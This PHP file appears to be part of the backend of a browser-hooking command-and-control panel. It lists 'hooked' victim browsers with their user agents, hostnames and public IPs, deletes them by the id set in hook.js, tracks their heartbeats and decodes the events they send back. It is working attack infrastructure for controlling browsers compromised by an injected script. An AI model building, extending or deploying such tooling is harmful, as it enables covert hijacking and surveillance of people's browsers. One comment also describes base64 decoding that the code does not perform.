<?php
    require_once('database.php');
    connectToDatabase();

   /*   Retrieve hooked browsers
    */
    function getHookedBrowsers() {
        if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("SELECT last_heartbeat, browser_id, user_agent, hostname, public_ip FROM hooked_browsers"))) {
            return;
        }
        
        if(!$stmt->execute()) {
            return;
        }
        
        $outLastHeartbeat = NULL;
        $outBrowserId = NULL;
        $outUserAgent = NULL;
        $outHostname = NULL;
        $outPublicIP = NULL;
        $hookedBrowsersList = array();

        $stmt->store_result();
        $stmt->bind_result($outLastHeartbeat, $outBrowserId, $outUserAgent, $outHostname, $outPublicIP);
        while ($stmt->fetch()) {
            $hookedBrowsersList[] = array('lastHeatbeat'=>$outLastHeartbeat, 'browserId'=>$outBrowserId, 'userAgent'=>$outUserAgent, 'hostname'=>$outHostname, 'publicIP'=>$outPublicIP);
        }

        $stmt->free_result();
        $stmt->close(); 

        return $hookedBrowsersList;
    }

   /*   Delete hooked browser
    *   $browserId = the id browser generated in hook.js
    */
    function deleteHookedBrowsers($browserId) {
        if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("DELETE FROM hooked_browsers WHERE browser_id = ?"))) {
            return;
        }
      
        if (!$stmt->bind_param("s", $browserId)) {
            return;
        }
      
        if (!$stmt->execute()) {
            return;
        }

        $stmt->close();
    }

   /*   Indicate if the hooked browser is alive (less than 5 sec between two hearthbeat requests)
    *   $lastHeartbeat = timestamp of the last heartbeat request
    */
    function isAlive($lastHeartbeat) {
        $now = time();
        $diff = $now - strtotime($lastHeartbeat);
        if($diff < 5) {
            return true;
        }

        return false;
    }

   /*   Return base64 decoded data or raw data (if decode base64 failed)
    *   $event = the event sent from hooked browser
    */
    function decodeJsonOrRaw($event) {
        $eventDecoded = json_decode($event);
        if(is_null($eventDecoded)) {
            return $event;
        }
        else {
            return json_encode($eventDecoded, JSON_PRETTY_PRINT);
        }
    }
?>